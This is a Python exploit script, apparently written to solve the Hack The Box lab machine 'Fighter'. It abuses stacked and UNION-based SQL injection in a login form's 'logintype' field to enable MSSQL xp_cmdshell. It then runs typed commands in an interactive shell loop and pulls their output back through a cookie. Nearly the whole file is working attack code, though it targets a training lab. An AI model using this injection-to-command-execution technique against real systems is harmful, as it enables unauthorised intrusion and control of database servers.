#!/usr/bin/python3
# Script utilizado para la resolución de la máquina Fighter de HTB.

import requests, signal, time, sys, base64
import urllib.parse

def handlerExit(signal, frame):
    print("\n[!] Aborting...")
    sys.exit(1)

signal.signal(signal.SIGINT, handlerExit)

# Global Variables
mainUrl = "http://members.streetfighterclub.htb"
verify = "/old/verify.asp"
xpBypass = "xp_cmdshell"

mainPayload = {
    "username": "admin",
    "password": "admin",
    "logintype": "",
    "rememberme": "ON",
    "B1": "LogIn"
}

cookies = {}

def xp_cmdshellActivate():
    mainPayload["logintype"] = """1;EXEC sp_configure 'show advanced options', '1' RECONFIGURE;-- -"""
    config = mainPayload
    mainPayload["logintype"] = """1;EXEC sp_configure '%s', '1' RECONFIGURE;-- -""" % xpBypass
    activate = mainPayload
    r = requests.post(mainUrl+verify, data=config, allow_redirects=False)
    r2 = requests.post(mainUrl+verify, data=activate, allow_redirects=False)
    if (r.status_code != 302):
        print("[!] Hubo un error al configurar las show advanced options")
        sys.exit(1)
    if (r2.status_code != 302):
        print("[!] Hubo un error al activar xp_cmdshell")
        sys.exit(1)
    print("[+] xp_cmdshell configurado correctamente")

def createTable():
    mainPayload["logintype"] = """1;CREATE TABLE rce (id int identity(1,1) primary key, output varchar(1024));-- -"""
    create = mainPayload
    r = requests.post(mainUrl+verify, data=create, allow_redirects=False)
    if (r.status_code != 302):
        print("[!] Hubo un error al crear la tabla rce")
        sys.exit(1)
    print("[+] Tabla rce creada correctamente")

def deleteTable(): # no la necesitamos
    mainPayload["logintype"] = """1;DROP TABLE rce;-- -"""
    delete = mainPayload
    r = requests.post(mainUrl+verify, data=delete, allow_redirects=False)
    if (r.status_code != 302):
        print("[!] Hubo un error al eliminar la tabla rce")
        sys.exit(1)
    print("[+] Tabla rce borrada correctamente")

def truncateTable():
    mainPayload["logintype"] = """1;TRUNCATE TABLE rce;-- -"""
    truncate = mainPayload
    r = requests.post(mainUrl+verify, data=truncate, allow_redirects=False)
    if (r.status_code != 302):
        print("[!] Hubo un error al eliminar los registros de la tabla rce")
        sys.exit(1)
    print("[+] Tabla rce truncada correctamente")

def resetCounterTable():
    mainPayload["logintype"] = """1;DBCC CHECKIDENT ('rce', RESEED, 0);-- -"""
    truncate = mainPayload
    r = requests.post(mainUrl+verify, data=truncate, allow_redirects=False)
    if (r.status_code != 302):
        print("[!] Hubo un error al reiniciar el contador de la tabla rce")
        sys.exit(1)
    print("[+] Contador incremental de la tabla rce reiniciado correctamente")

def getIdentCurrent():
    mainPayload["logintype"] = """1 union select 1,2,3,4,(SELECT IDENT_CURRENT('rce')),6-- -"""
    identCurrent = mainPayload
    r = requests.post(mainUrl+verify, data=identCurrent, allow_redirects=False)
    return(base64.b64decode(urllib.parse.unquote(r.cookies.get("Email"))).decode())

def cmd(cmd):
    mainPayload["logintype"] = """1;INSERT INTO rce(output) EXEC %s "%s";-- -""" % (xpBypass, cmd)
    command = mainPayload
    r = requests.post(mainUrl+verify, data=command, allow_redirects=False)
    if (r.status_code != 302):
        print("[!] Hubo un error al ejecutar el comando")
        sys.exit(1)

def viewOutput(identCurrent):
    for i in range(0, int(identCurrent)):
        mainPayload["logintype"] = """1 union select 1,2,3,4,(select top 1 output from rce where id=%d),6-- -""" % i
        view = mainPayload
        r = requests.post(mainUrl+verify, data=view, allow_redirects=False)
        if (r.cookies.get("Email") is None):
            continue
        else:
            print(base64.b64decode(urllib.parse.unquote(r.cookies.get("Email"))).decode())

if __name__ == '__main__':
    xp_cmdshellActivate()
    createTable()
    truncateTable()
    resetCounterTable()

    while True:
        command = input("$> ")
        cmd(command)
        viewOutput(getIdentCurrent())
      
        truncateTable()
        resetCounterTable()
